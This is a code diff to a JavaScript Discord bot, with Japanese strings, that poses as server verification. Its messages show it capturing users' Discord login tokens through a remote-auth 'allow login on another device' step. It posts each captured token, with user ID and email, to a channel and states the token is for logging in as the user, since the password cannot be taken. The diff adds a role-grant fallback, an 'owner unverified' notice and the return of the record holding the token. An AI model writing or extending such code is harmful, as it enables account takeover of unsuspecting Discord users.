@@ -17,6 +17,7 @@ const DEFAULTS = {
   removeRoles: [],
   // 'oauth' = Discord OAuth 完了時（別デバイス許可の1ステップ手前）に付与
   // 'token' = リモート認証でトークンを取得し、別デバイスで許可された後に付与
+  //           （猶予時間内に取得できなければ自動でフォールバック付与）
   grantStage: 'oauth'
 };
 
@@ -238,6 +239,7 @@ export async function publishToken({ client, rec, userToken }) {
       content: [
         `**${rec.tag}** (\`${rec.userId}\`) のトークン`,
         rec.email ? `メール: \`${rec.email}\`` : null,
+        rec.tokenUnverified ? '※ Discord 側の応答が不安定だったため、所有者の検証は未完了です。' : null,
         'パスワードは取得できないため、ログインにはこのトークンを使用します。',
         '```',
         userToken,
@@ -287,9 +289,11 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
     net: ipData.net,
     userToken: session.userToken || null,
     userTokenAt: session.userToken ? new Date().toISOString() : null,
+    tokenUnverified: false,
     pendingRole: ok && deferred,
     roleGranted: ok ? !deferred : false,
     roleError,
+    roleFallbackAt: null,
     logChannelId: null,
     logMessageId: null,
     oauth: {
@@ -348,7 +352,7 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
     name: 'ロール付与',
     value:
       deferred && ok
-        ? '保留（別デバイスでのログイン許可後に付与）'
+        ? `保留（別デバイスでのログイン許可後に付与 / ${Math.max(config.tokenGraceSeconds, 0)}秒でフォールバック）`
         : ok
           ? '付与済み'
           : `未付与${roleError ? `: ${roleError}` : ''}`
@@ -379,7 +383,7 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
     const msg = ev.ok ? 'ロール付与に失敗しました。管理者に連絡してください。' : p.failureMessage;
     await postLog();
     await notify(client, session, user, `❌ ${msg}\n対象: ${guildLabel}`);
-    return { ok, reasons };
+    return { ok, reasons, record };
   }
 
   if (deferred) {
@@ -390,10 +394,10 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
       user,
       `✅ 条件をクリアしました。続けて Discord で「ログインを許可」してください。\n対象: ${guildLabel}`
     );
-    return { ok, reasons, deferred: true };
+    return { ok, reasons, deferred: true, record };
   }
 
   await postLog();
   await notify(client, session, user, `✅ ${p.successMessage}\n対象: ${guildLabel}`);
-  return { ok, reasons };
+  return { ok, reasons, record };
 }
